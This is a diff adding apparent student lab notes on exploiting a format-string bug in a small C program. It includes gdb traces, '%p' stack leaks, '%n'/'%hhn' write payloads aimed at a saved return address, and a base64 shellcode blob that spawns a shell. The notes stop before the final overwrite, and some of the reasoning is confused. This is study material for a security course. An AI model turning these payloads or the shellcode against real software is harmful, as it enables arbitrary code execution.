@@ -1,0 +1,244 @@
+README:
+https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
+
+The trick here is to exploit the `printf` call which seeks arguments from the
+call stack which are not passed in.
+
+We should expect to find `0xbabe` (ie: pad) found at 1024 bytes ahead.
+
+So we will generate a string which fills the buf with '%p'*512.
+
+We will take the result of what it prints and look for it printed, we find
+it is the 263rd returned pointer.  The majority of the values preceding it
+are the expected 0x70257025 (ie: '%p')
+
+
+Let's set a break point at at the call to the `printf`.
+
+  `break *main+69`
+Let's just keep these down:
+  0xbffff440 -> buf
+
+-----
+
+The trick here is obviously to exploit the `printf` call conventions using
+stack overflow.  We want to poison the $esp variable to inject a new address
+into the return value.  But since we're in the main, we have to exploit the
+ELF architecture which uses `__libc_csu_init` to call inside to main.
+
+  > disass __libc_csu_init
+   ...
+   ; Jump to to *__libc_csu_init+82 to enter `main()`
+   0x0804843a <+42>:	test   edi,edi
+   0x0804843c <+44>:	je     0x8048462 <__libc_csu_init+82>
+   ...
+   0x08048460 <+80>:	jb     0x8048440 <__libc_csu_init+48>
+   ...
+   ;  Add 0xc (12) to the $esp
+   0x08048462 <+82>:	add    esp,0xc
+   ... nothing that affects $esp ...
+   0x08048469 <+89>:	ret
+
+So we need to polute the $esp + 12 value with the address we want.
+
+So let's look at the at the frame at this point: `*__libc_csu_init+82`
+
+  > info frame
+  Stack level 0, frame at 0xbffffc60:
+    eip = 0x8048462 in __libc_csu_init; saved eip = 0xb7e26216
+    called by frame at 0xbffffcd0
+    Arglist at 0xbffffc58, args:
+    Locals at 0xbffffc58, Previous frame's sp is 0xbffffc60
+    Saved registers:
+     ebx at 0xbffffc4c, ebp at 0xbffffc58, esi at 0xbffffc50, edi at 0xbffffc54,
+     eip at 0xbffffc5c
+
+We can see that eip will be at `0xbffffc5c`.
+
+
+-------
+  # Finding pad
+  pad   = *ebp - 0xc = (*ebp - 12)
+    0x080483b7 <+19>:	mov    DWORD PTR [ebp-0xc],0xbabe
+
+  # Finding buf
+  buf   = *esp + 0x4
+        = $ebp + 0xc + 0x4
+
+    0x080483c6 <+34>:	mov    eax,DWORD PTR [ebp+0xc]
+    0x080483c9 <+37>:	add    eax,0x4
+    0x080483cc <+40>:	mov    eax,DWORD PTR [eax]
+    0x080483ce <+42>:	mov    DWORD PTR [esp+0x4],eax
+    0x080483d2 <+46>:	lea    eax,[ebp-0x418]
+    0x080483d8 <+52>:	mov    DWORD PTR [esp],eax
+
+
+
+Now we want to know where to find the buffer in the `printf` function
+call.  The starting $esp - 0xc - 0x4 + 0x18.  These are the same offsets
+in the `main`, cancelling out and resulting in $esp+0x18 ($esp + 24).
+
+Within the `printf` function, this is the assembly:
+    0xb7e57940 <+0>:	call   0xb7f2f379
+    0xb7e57945 <+5>:	add    eax,0x16a6bb
+  # Unclear to me why we are winding down the stack by 12 into the
+  # callers frame.
+    0xb7e5794a <+10>:	sub    esp,0xc
+    0xb7e5794d <+13>:	mov    eax,DWORD PTR [eax-0x5c]
+    0xb7e57953 <+19>:	lea    edx,[esp+0x14]
+  # Unclear why we wind it down another 4 bytes.
+    0xb7e57957 <+23>:	sub    esp,0x4
+    0xb7e5795a <+26>:	push   edx
+
+  # But here we add 24 bytes.
+    0xb7e5795b <+27>:	push   DWORD PTR [esp+0x18]
+    0xb7e5795f <+31>:	push   DWORD PTR [eax]
+    0xb7e57961 <+33>:	call   0xb7e50280 <vfprintf>
+    0xb7e57966 <+38>:	add    esp,0x1c
+    0xb7e57969 <+41>:	ret
+
+On the stack there are now registers of:
+  esx = -16
+  edx = - 8
+  esp+0x18
+  eax
+
+
+-------
+Let's find some addresses....
+
+  # Finding pad
+  pad   = $ebp - 0xc = ($ebp - 12)
+    0x080483b7 <+19>:	mov    DWORD PTR [ebp-0xc],0xbabe
+
+  # Finding buf
+  buf   = $esp + 0x4
+        = $ebp + 0xc + 0x4
+
+    0x080483c6 <+34>:	mov    eax,DWORD PTR [ebp+0xc]
+    0x080483c9 <+37>:	add    eax,0x4
+    0x080483cc <+40>:	mov    eax,DWORD PTR [eax]
+    0x080483ce <+42>:	mov    DWORD PTR [esp+0x4],eax
+    0x080483d2 <+46>:	lea    eax,[ebp-0x418]
+    0x080483d8 <+52>:	mov    DWORD PTR [esp],eax
+
+Let's look at the offset for how far into the memory we need to go to
+find the overflow into the `buf` region.  We will pass in:
+
+  > run $(python -c "print('wwww' + '%p.' * 8)")
+    wwww0xbffffe11.0x3ff.0xbffff878.0x77777777.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.
+
+We can see it is the 4th pointer.  Which means we have an offset of 4 * 3
+pointers.
+
+This puts at in the main's:
+  $esp + 0xc + 0x4 + 12
+AKA (current frames...)
+  $ebp + 8
+
+This is because:
+  $ebp     = 0xbffffe11
+  $ebp + 4 = 0x3ff
+  $ebp + 8 = 0xbffff878
+  $ebp +12 = 0x77777777
+
+We can see this when putting `break` on `printf`.
+
+  ; {
+  ; These two are pushed onto the stack in the printf call chain.
+  0000| 0xbffff81c --> 0x80483ee (<main+74>:	mov    eax,0x0)
+  0004| 0xbffff820 --> 0xbffff830 ("wwww%p.%p.%p.%p.%p.%p.%p.%p.")
+  ; }
+
+  0008| 0xbffff824 --> 0xbffffe11 ("wwww%p.%p.%p.%p.%p.%p.%p.%p.")
+  0012| 0xbffff828 --> 0x3ff
+  0016| 0xbffff82c --> 0xbffff878 --> 0x0
+  0020| 0xbffff830 ("wwww%p.%p.%p.%p.%p.%p.%p.%p.")
+
+- We can demonstrate that we can store a variable using the counter.
+  > run '%4$p.%4$n'
+  > p $esi
+  $28 = 0xb = len('0xXXXXXXXX.')
+
+OR more convenientl to see...
+
+  > run $(echo -e "\xef\xbe\xad\xde.%4\$n.%4\$p")
+  > p $eax
+  $33 = 0xdeadbeef
+  > p $esi
+  $34 = 0x5
+
+
+Now we need to find the return value address:
+
+  > break *__libc_start_main+336 <-- This is printf
+  run ....
+  > info frame
+  Stack level 0, frame at 0xbffffc50:
+  eip = 0x80483ee in main; saved eip = 0xb7e26286
+  called by frame at 0xbffffcc0
+  Arglist at 0xbffffc48, args:
+  Locals at 0xbffffc48, Previous frame's sp is 0xbffffc50
+  Saved registers:
+  ebp at 0xbffffc48, eip at 0xbffffc4c
+
+Now we need to store the data somewhere.
+
+
+See below for injection discovery:
+  0xb7e26286 is the target address we want to write into.
+  0xb7 = 183 183 - 134 = %049d : %6\$hhn
+  0xe2 = 226 226 - 183 = %043d : %7\$hhn
+  0x62 =  98  98 -   4 = %094d : %4\$hhn
+  0x86 = 134 134 -  98 = %036d : %5\$hhn
+
+export EXPLOIT="$(echo -n 'amhoLy8vc2gvYmluieNoAQEBAYE0JHJpAQExyVFqBFkB4VGJ4THSagtYzYA=' | base64 -d')" -> 0xbffffe1f
+  Add 8 to getout the "EXPLOIT="
+  --> 0xbffffe27
+
+  \0xbfff = 49151
+  \0xfe27 = 65063
+
+  Pad 1: (49151 - 4 - 20)
+  Pad 2: (65063 - 49151 - 4 - 20)
+
+  \x5c\xfc\xff\xbf%049147d%4\$hx%115908d%5\$hx
+
+There is 4 ahead, so we craft these in an order:
+  Address =
+    //\x28\xfc\xff\xbf
+    //\x86\x62\xe2\xb7
+
+    \x86\x62\xe2\xb7%094d%4\$hhn%036d%5\$hhn%049d%6\$hhn%043d%7\$hhn
+    \x5c\xfc\xff\xbf%094d%4\$hhn%036d%5\$hhn%049d%6\$hhn%043d%7\$hhn
+
+- Now we know what makes sense, lets look for the for where we can store the
+  return address.
+
+  > run $(python3 -c "print('%p' * 300)")
+  # Once printed out, I have a script to parse this, eventually we will run
+  # into this.
+  ...
+  0256 : 0x70257025
+  0257 : 0x70257025
+  0258 : 0x8257025
+  0259 : 0xb7fc23dc
+  0260 : 0x80481a4
+  0261 : 0x804841b
+  0262 : 0xbabe     <-- SENTINAL
+  0263 : 0x2
+  0264 : 0xb7fc2000
+  0265 : (nil)
+  0266 : 0xb7e26286 <-- __libc_start_main+246
+  0267 : 0x2
+  0268 : 0xbffff8f4
+  0269 : 0xbffff900
+
+We can confirm this:
+  > run '%263$p'
+  0xbabe
+
+  > run '%267$p'
+  0xb7e26286
+
+So let's try to overwrite that by doing....
